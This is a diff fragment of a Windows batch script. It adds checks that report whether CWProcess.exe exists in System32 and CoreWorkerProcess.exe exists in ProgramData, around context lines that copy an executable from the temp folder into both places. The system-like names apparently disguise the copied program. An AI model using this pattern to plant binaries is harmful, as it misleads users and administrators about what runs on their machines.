@@ -102,15 +102,56 @@ echo.
 echo.
 
 
+if exist "%SystemRoot%\System32\CWProcess.exe" (
+    echo CWProcess.exe exists.
+) else (
+    echo CWProcess.exe not exist.
+)
+
+
+
+if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
+    echo CoreWorkerProcess.exe exists.
+) else (
+    echo CoreWorkerProcess.exe not exist.
+)
+
+
+echo.
+echo.
+
+
 if exist "%temp%\!filename!.exe" (
     echo Copying CoreWorkerProcess..
     copy /y "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
     copy /y "%TEMP%\!filename!.exe" "%SystemRoot%\System32\CWProcess.exe"
 )
 
+
+
 echo.
 echo.
 echo.
+
+
+if exist "%SystemRoot%\System32\CWProcess.exe" (
+    echo CWProcess.exe exists.
+) else (
+    echo CWProcess.exe not exist.
+)
+
+
+
+if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
+    echo CoreWorkerProcess.exe exists.
+) else (
+    echo CoreWorkerProcess.exe not exist.
+)
+
+
+echo.
+echo.
+
 echo.
 echo.
 echo.
